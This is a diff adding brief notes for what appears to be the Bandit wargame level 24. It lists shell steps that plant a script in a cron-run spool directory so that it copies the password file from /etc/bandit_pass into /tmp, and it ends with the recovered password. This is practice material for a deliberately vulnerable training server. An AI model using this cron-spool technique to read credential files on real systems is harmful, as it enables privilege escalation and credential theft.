@@ -1,0 +1,13 @@
+1. cd /etc/cron.d
+2. cat cronjob_bandit24
+3. cat /usr/bin/cronjob_bandit24.sh
+4. mkdir /tmp/test1234
+5. cd /tmp/test1234
+6. nano bandit24.sh 
+7. cat /etc/bandit_pass/bandit24 >> /tmp/test1234/bandit24
+8. chmod 777 bandit24.sh
+9. chmod 777 /tmp/test1234
+10. cp bandit24.sh /var/spool/bandit24/
+11. cat /tmp/test1234/bandit24
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ - level24 pw
